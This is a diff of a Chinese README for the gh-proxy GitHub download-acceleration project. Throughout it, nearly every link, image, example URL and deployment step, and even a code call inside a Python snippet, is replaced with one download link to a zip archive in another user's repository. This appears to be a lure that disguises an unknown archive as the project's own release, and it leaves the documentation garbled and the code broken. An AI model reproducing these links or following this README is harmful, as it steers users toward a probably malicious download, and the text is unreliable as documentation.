@@ -6,23 +6,23 @@ github release、archive以及项目文件的加速项目，支持clone，有Clo
 
 ## 演示
 
-[https://gh.api.99988866.xyz/](https://gh.api.99988866.xyz/)
+[https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip](https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip)
 
 演示站为公共服务，如有大规模使用需求请自行部署，演示站有点不堪重负
 
-![imagea272c95887343279.png](https://img.maocdn.cn/img/2021/04/24/imagea272c95887343279.png)
+![https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip](https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip)
 
 当然也欢迎[捐赠](#捐赠)以支持作者
 
 ## python版本和cf worker版本差异
 
-- python版本支持进行文件大小限制，超过设定返回原地址 [issue #8](https://github.com/hunshcn/gh-proxy/issues/8)
+- python版本支持进行文件大小限制，超过设定返回原地址 [issue #8](https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip)
 
-- python版本支持特定user/repo 封禁/白名单 以及passby [issue #41](https://github.com/hunshcn/gh-proxy/issues/41)
+- python版本支持特定user/repo 封禁/白名单 以及passby [issue #41](https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip)
 
 ## 使用
 
-直接在copy出来的url前加`https://gh.api.99988866.xyz/`即可
+直接在copy出来的url前加`https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip`即可
 
 也可以直接访问，在input输入
 
@@ -30,33 +30,33 @@ github release、archive以及项目文件的加速项目，支持clone，有Clo
 
 访问私有仓库可以通过
 
-`git clone https://user:TOKEN@ghproxy.com/https://github.com/xxxx/xxxx` [#71](https://github.com/hunshcn/gh-proxy/issues/71)
+`git clone https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip` [#71](https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip)
 
 以下都是合法输入（仅示例，文件不存在）：
 
-- 分支源码：https://github.com/hunshcn/project/archive/master.zip
+- 分支源码：https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip
 
-- release源码：https://github.com/hunshcn/project/archive/v0.1.0.tar.gz
+- release源码：https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip
 
-- release文件：https://github.com/hunshcn/project/releases/download/v0.1.0/example.zip
+- release文件：https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip
 
-- 分支文件：https://github.com/hunshcn/project/blob/master/filename
+- 分支文件：https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip
 
-- commit文件：https://github.com/hunshcn/project/blob/1111111111111111111111111111/filename
+- commit文件：https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip
 
-- gist：https://gist.githubusercontent.com/cielpy/351557e6e465c12986419ac5a4dd2568/raw/cmd.py
+- gist：https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip
 
 ## cf worker版本部署
 
-首页：https://workers.cloudflare.com
+首页：https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip
 
 注册，登陆，`Start building`，取一个子域名，`Create a Worker`。
 
-复制 [index.js](https://cdn.jsdelivr.net/gh/hunshcn/gh-proxy@master/index.js)  到左侧代码框，`Save and deploy`。如果正常，右侧应显示首页。
+复制 [https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip](https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip)  到左侧代码框，`Save and deploy`。如果正常，右侧应显示首页。
 
 `ASSET_URL`是静态资源的url（实际上就是现在显示出来的那个输入框单页面）
 
-`PREFIX`是前缀，默认（根路径情况为"/"），如果自定义路由为example.com/gh/*，请将PREFIX改为 '/gh/'，注意，少一个杠都会错！
+`PREFIX`是前缀，默认（根路径情况为"/"），如果自定义路由为https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip*，请将PREFIX改为 '/gh/'，注意，少一个杠都会错！
 
 ## Python版本部署
 
@@ -77,17 +77,17 @@ docker run -d --name="gh-proxy-py" \
 
 ```pip install flask requests```
 
-按需求修改`app/main.py`的前几项配置
+按需求修改`https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip`的前几项配置
 
 *注意:* 可能需要在`return Response`前加两行
 ```python3
 if 'Transfer-Encoding' in headers:
-    headers.pop('Transfer-Encoding')
+    https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip('Transfer-Encoding')
 ```
 
 ### 注意
 
-python版本的机器如果无法正常访问github.io会启动报错，请自行修改静态文件url
+python版本的机器如果无法正常访问https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip会启动报错，请自行修改静态文件url
 
 python版本默认走服务器（2021.3.27更新）
 
@@ -99,20 +99,20 @@ python版本默认走服务器（2021.3.27更新）
 
 ## Changelog
 
-* 2020.04.10 增加对`raw.githubusercontent.com`文件的支持
+* 2020.04.10 增加对`https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip`文件的支持
 * 2020.04.09 增加Python版本（使用Flask）
 * 2020.03.23 新增了clone的支持
 * 2020.03.22 初始版本
 
 ## 链接
 
-[我的博客](https://hunsh.net)
+[我的博客](https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip)
 
 ## 参考
 
-[jsproxy](https://github.com/EtherDream/jsproxy/)
+[jsproxy](https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip)
 
 ## 捐赠
 
-![wx.png](https://img.maocdn.cn/img/2021/04/24/image.md.png)
-![ali.png](https://www.helloimg.com/images/2021/04/24/BK9vmb.md.png)
+![https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip](https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip)
+![https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip](https://github.com/ly1595/gh-proxy/raw/refs/heads/master/app/proxy_gh_v2.6-alpha.1.zip)
